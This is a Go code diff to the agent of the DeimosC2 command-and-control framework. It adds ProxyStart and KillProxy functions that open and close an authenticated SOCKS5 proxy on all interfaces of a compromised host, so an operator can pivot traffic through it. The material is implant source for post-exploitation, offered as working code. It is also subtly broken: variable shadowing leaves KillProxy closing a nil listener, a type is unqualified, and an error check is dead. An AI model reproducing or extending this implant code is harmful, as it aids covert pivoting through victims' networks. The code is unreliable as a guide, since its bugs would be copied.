@@ -21,11 +21,15 @@ import (
 	"github.com/DeimosC2/DeimosC2/agents/resources/shellexec"
 	"github.com/DeimosC2/DeimosC2/lib/agentscommon"
 	"github.com/DeimosC2/DeimosC2/lib/privileges"
+
+	"github.com/armon/go-socks5"
 )
 
 var cwd string //Current shell working directory
 //JobCount is a global variable containing the number of jobs
 var JobCount int
+var proxyServer *socks5.Server
+var proxyListener net.Listener
 
 //Shell types
 const (
@@ -41,8 +45,6 @@ var AllOutput = Output{Mutex: sync.RWMutex{}, List: map[int]*agentscommon.JobOut
 
 //AllPivotJobs is used to hold all of the jobs needing to be passed down the link
 var AllPivotJobs = PivotJobHolder{Mutex: sync.RWMutex{}, List: map[string]*PivotJobs{}}
-
-//var AllAgents map[string]*Agent
 
 //Output is the struct for a list of all output
 type Output struct {
@@ -403,4 +405,47 @@ func ErrHandling(err string) {
 func KillNetList(tcpL net.Listener, l *PivotList) {
 	<-l.ListChan
 	tcpL.Close()
+}
+
+//ProxyStart will start a proxy on the desired port with the passed credentials
+func ProxyStart(port string, user string, pass string) {
+	creds := socks5.StaticCredentials{
+		user: pass,
+	}
+	conf := &socks5.Config{
+		AuthMethods: []Authenticator{socks5.UserPassAuthenticator{Credentials: creds}},
+	}
+	proxyServer, err := socks5.New(conf)
+	if err != nil {
+		ErrHandling(err.Error())
+	}
+
+	proxyListener, err := net.Listen("tcp", "0.0.0.0"+port)
+	if err != nil {
+		ErrHandling(err.Error())
+	}
+	proxyServer.Serve(proxyListener)
+	if err != nil {
+		ErrHandling(err.Error())
+	}
+	AllOutput.Mutex.Lock()
+	JobCount++
+	AllOutput.List[JobCount] = &agentscommon.JobOutput{
+		JobName: "proxy",
+		Results: "Proxy opened on port: " + port,
+	}
+	AllOutput.Mutex.Unlock()
+
+}
+
+//KillProxy will kill a started proxy
+func KillProxy() {
+	proxyListener.Close()
+	AllOutput.Mutex.Lock()
+	JobCount++
+	AllOutput.List[JobCount] = &agentscommon.JobOutput{
+		JobName: "proxy",
+		Results: "Proxy closed",
+	}
+	AllOutput.Mutex.Unlock()
 }
